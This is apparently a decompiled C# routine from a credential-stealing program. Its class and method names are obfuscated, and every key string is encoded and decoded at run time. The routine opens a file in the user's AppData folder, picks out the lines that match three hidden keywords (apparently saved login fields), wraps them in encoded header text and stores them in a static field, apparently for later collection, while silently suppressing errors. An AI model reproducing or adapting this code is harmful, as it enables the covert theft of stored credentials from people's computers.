using System;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

public class DAPGDN
{
	public class PGDNdll
	{
		public static void GTMYPig()
		{
			try
			{
				string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("hnPAzLuasbWzqo2ov8y3nrh+z7aWHQ==", "False");
				string text2 = Conversions.ToString(1);
				text2 = ((ServerComputer)MyProject.Computer).get_FileSystem().OpenTextFileReader(text).ReadToEnd();
				string text3 = GOSLWHR.WHJBIYT("aYSPlohphI+WiGmEosKykLDAlohphI+WiGmEj5aIaYQc", "False") + Environment.NewLine + Environment.NewLine;
				string[] array = text2.Split(new char[1] { '\r' });
				text2 = null;
				string[] array2 = array;
				foreach (string text4 in array2)
				{
					if (text4.Contains(GOSLWHR.WHJBIYT("d8bT186qudDUmAs=", "False")))
					{
						text3 = text3 + text4 + Environment.NewLine;
					}
					if (text4.Contains(GOSLWHR.WHJBIYT("Y7CuwatlIA==", "False")))
					{
						text3 = text3 + text4 + Environment.NewLine;
					}
					if (text4.Contains(GOSLWHR.WHJBIYT("dMO/2MqvwtDJlQ4=", "False")))
					{
						text3 = text3 + text4 + Environment.NewLine + Environment.NewLine;
					}
				}
				NTUIYURW.WNKBHEQ = text3 + Environment.NewLine + Environment.NewLine + GOSLWHR.WHJBIYT("Z4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4Ie", "False");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				NTUIYURW.WNKBHEQ = "";
				ProjectData.ClearProjectError();
			}
		}
	}
}
